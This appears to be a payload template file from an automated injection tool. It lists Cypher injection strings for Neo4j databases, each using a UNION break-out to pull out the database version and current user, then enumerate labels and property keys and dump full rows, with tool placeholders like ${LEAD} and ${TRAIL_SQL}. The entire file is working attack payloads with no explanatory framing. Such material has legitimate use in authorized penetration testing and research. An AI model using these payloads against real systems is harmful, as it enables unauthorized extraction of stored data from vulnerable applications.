resource.info: 'a'as A limit 0 union MATCH (n) RETURN distinct '${LEAD}' %2b 'version' %2b '${ENCLOSE_VALUE_SQL}' %2b 'database()' %2b '${ENCLOSE_VALUE_SQL}' %2b 'current_user()' %2b '${TRAIL_SQL}'

schema.database: 'a'as A limit 0 union MATCH (n) RETURN distinct '${LEAD}' %2b '${ENCLOSE_VALUE_SQL}neo4j${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}' AS A {limit} union match (n:aze) return 'a'
schema.table: 'a'as A limit 0 union CALL db.labels() YIELD label RETURN '${LEAD}' %2b reduce( totalAge = '', n in collect(label) | totalAge %2b '${ENCLOSE_VALUE_SQL}' %2b n %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}' ) %2b '${TRAIL_SQL}' AS A {limit} union match (n:aze) return 'a'
schema.column: 'a'as A limit 0 union MATCH (n:${TABLE}) with collect(keys(n)) as attr unwind attr as r with distinct r[0] as d order by d return '${LEAD}' %2b reduce( totalAge = '', n in collect(d) | totalAge %2b '${ENCLOSE_VALUE_SQL}' %2b n %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}' ) %2b '${TRAIL_SQL}' AS A {limit} union match (n:aze) return 'a'

row.query: 'a'as A limit 0 union MATCH (n:${TABLE}) RETURN '${LEAD}' %2b reduce(totalAge = "", n in collect(n) | totalAge %2b '${ENCLOSE_VALUE_SQL}' %2b ${FIELDS} %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}' ) %2b '${TRAIL_SQL}' AS A {limit} union match (n:aze) return 'a'

configuration.calibrator: 'a'as A limit 0 union MATCH (n) RETURN '${LEAD}${INDICE}' %2b reduce(a = "", nn in collect(n) | a %2b "${CALIBRATOR_SQL}")
